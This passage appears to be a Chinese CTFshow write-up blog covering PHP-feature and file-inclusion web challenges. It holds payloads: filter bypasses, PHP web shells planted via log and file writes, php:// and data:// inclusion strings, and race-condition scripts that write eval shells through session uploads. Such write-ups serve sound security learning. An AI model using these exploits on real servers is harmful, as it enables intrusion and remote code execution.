single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>正则匹配绕过，只要ctfshow里有一个不是数字、小写字母和下划线就能绕过。</p><blockquote><p><strong>&#x2F;i</strong>：大小写不敏感匹配</p><p><strong>&#x2F;s</strong>：点号元字符匹配所有字符，包含换行符。</p><p><strong>&#x2F;D</strong>：元字符美元符号仅仅匹配目标字符串的末尾</p></blockquote><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。</p></blockquote><p><img src="web147.png" alt="在这里插入图片描述" loading="lazy"></p><p>（详情可以看php手册里的命名空间部分）</p><p>所以post时<code>ctf</code>可以通过加上<code>\</code>绕过匹配。%5c</p><p>找个不需要第一个参数的函数。可以用create_function匿名函数。虽然该函数自PHP 7.2起已经弃用，但是还是可以eval执行函数，只是需要把匿名部分闭合。</p><p><strong>get</strong>：<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>：<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="在这里插入图片描述" loading="lazy"></p><p>可以这么理解：create_function创建一个匿名函数，我们假设就叫niming。 <code>string create_function( string $args, string $code)</code>那么具体就是如下面所示的样子：</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>所以就需要<code>&#125;</code>闭合，闭合之后，那就多出来一个<code>&#125;</code>，这就需要用注释符注释掉。</p><h4 id="web148-中文变量-异或"><a href="#web148-中文变量-异或" class="headerlink" title="web148(中文变量  异或)"></a>web148(中文变量  异或)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>没ban异或</p><p>Payload：<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>预期解是使用中文 <code>?code=$哈=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> 异或出来的结果是 _GET</p><h4 id="web149-unlink-文件覆盖"><a href="#web149-unlink-文件覆盖" class="headerlink" title="web149(unlink  文件覆盖)"></a>web149(unlink  文件覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> 函数删除文件。</p><p>若成功，则返回 true，失败则返回 false。</p><p>直接向index.php写马就行</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIP可以通过extract进行变量覆盖，ctf被限制不能有:</p><p>可以利用nginx日志文件写马</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>过滤了log，看着可以用条件竞争</p><p>看了hint 利用 <code>__autoload()</code></p><p>于是查了一下 <code>class_exists()</code> 这个函数</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>修复了非预期，不让包含日志文件了。</p><p>这里利用了 <code>extract</code> 覆盖变量会把 <code>空格 [ .</code> 都给转成下划线的特性，绕过正则过滤。然后就是 <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> 第二个参数默认为 <code>true</code>，在类不存在时会调用 <code>__autoload</code> 函数，<code>__autoload</code> 这里写的是调用要加载的类名的函数，传 <code>phpinfo</code> 就能得到 <code>session</code>相关信息，从而包含 <code>session</code>。</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>可以看到 <code>session.use_strict_mode</code> 为 Off，说明可以自定义 <code>session_id</code>，控制 <code>session</code> 文件名， <code>session.save_path</code> 为空，确定文件包含路径 <code>/tmp/sess_&#123;session_id&#125;</code>。改一下祖传脚本写 shell。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHP文件包含漏洞（利用phpinfo）](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub (github.com)</a>)</p><p>这篇详细讲解了漏洞的利用，之前的条件竞争就是这样</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-include</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-include/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-include/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要考察是php伪协议，之前Rce里也有提过，这里放几个常用Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>签到</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>将php过滤，可以考虑data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>data也被ban了</p><p>使用nginx日志文件包含，在User-Agent写入一句话木马，使用蚁剑连接<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>看题解也可以大小写绕过用PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>多过滤了冒号，所以依旧可以nginx日志注入</p><h4 id="web82-利用session-upload-progress进行文件包含"><a href="#web82-利用session-upload-progress进行文件包含" class="headerlink" title="web82(利用session.upload_progress进行文件包含)"></a>web82(利用session.upload_progress进行文件包含)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>但是问题来了，默认配置session.upload_progress.cleanup &#x3D; on导致文件上传后，session文件内容立即清空，</p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><p><strong>session文件默认存储路径</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>方法一:</strong></p><p>先以POST的形式发包，上传的文件随意,下面是构造的上传表单</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>使用burp进行爆破（两个要同时爆破）</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>最后竞争得到flag</p><p><strong>方法二</strong>:</p><p>可以利用脚本进行条件竞争</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token 